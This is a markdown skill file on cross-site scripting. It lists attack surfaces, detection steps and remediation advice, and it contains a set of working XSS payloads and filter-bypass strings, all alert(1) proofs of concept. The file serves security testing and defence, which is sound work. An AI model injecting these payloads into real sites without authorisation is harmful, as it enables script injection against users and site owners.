---
name: xss
description: Cross-Site Scripting detection and exploitation techniques
---

# Cross-Site Scripting (XSS)

## Attack Surface

- User input reflected in HTML body, attributes, JavaScript, or CSS contexts
- URL parameters, form fields, HTTP headers (Referer, User-Agent)
- Stored data rendered without encoding (comments, profiles, messages)
- DOM manipulation via `document.location`, `document.URL`, `innerHTML`
- File upload names and metadata rendered in UI

## Detection Techniques

- Inject unique canary strings and check if they appear unencoded in response
- Test each input context separately (HTML, attribute, JS, URL)
- Check for reflected input in response headers (header injection)
- Analyze CSP headers for bypass opportunities (`unsafe-inline`, `unsafe-eval`)
- Inspect DOM sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`
- Look for event handler attributes accepting user input

## Common Payloads

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><img src=x onerror=alert(1)>
'-alert(1)-'
javascript:alert(1)
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
${alert(1)}
{{constructor.constructor('alert(1)')()}}
```

### Filter Bypass Patterns

```
<scr<script>ipt>alert(1)</script>
<IMG SRC=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<input onfocus=alert(1) autofocus>
```

## Remediation

- Context-aware output encoding (HTML entity, JS escape, URL encode, CSS escape)
- Implement strict Content-Security-Policy: `default-src 'self'; script-src 'nonce-{random}'`
- Use `HTTPOnly` and `Secure` flags on session cookies
- Sanitize HTML input with allowlist-based libraries (DOMPurify, bleach)
- Avoid `innerHTML`; prefer `textContent` or framework-safe bindings
- Set `X-Content-Type-Options: nosniff` to prevent MIME sniffing

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
